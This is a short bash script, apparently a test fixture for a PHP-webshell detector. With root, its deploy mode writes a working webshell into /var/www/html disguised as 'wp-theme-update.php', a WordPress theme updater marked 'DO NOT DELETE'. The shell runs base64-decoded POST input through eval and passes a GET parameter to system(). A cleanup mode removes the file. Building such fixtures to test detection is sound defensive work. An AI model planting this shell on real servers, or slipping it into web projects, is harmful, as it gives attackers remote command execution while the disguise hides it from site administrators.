#!/usr/bin/env bash
# PHP webshell: a disguised eval-based shell dropped in the web root.
# score_content() will flag eval + base64_decode + system keywords.
# /var/www/html/ is created if it doesn't exist.
# Detected by: defender-cli anti-persistence --php-shells
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

SHELL_FILE="/var/www/html/wp-theme-update.php"

case "${1:-}" in
  deploy)
    mkdir -p /var/www/html
    cat > "$SHELL_FILE" << 'EOF'
<?php
// WordPress Theme Updater v2.1 — DO NOT DELETE
if (isset($_POST['k']) && $_POST['k'] === 'secret') {
    @eval(base64_decode($_POST['cmd']));
    system($_GET['c']);
}
?>
EOF
    echo "[+] 09_php_shell: $SHELL_FILE installed"
    ;;
  cleanup)
    rm -f "$SHELL_FILE"
    echo "[-] 09_php_shell: $SHELL_FILE removed"
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
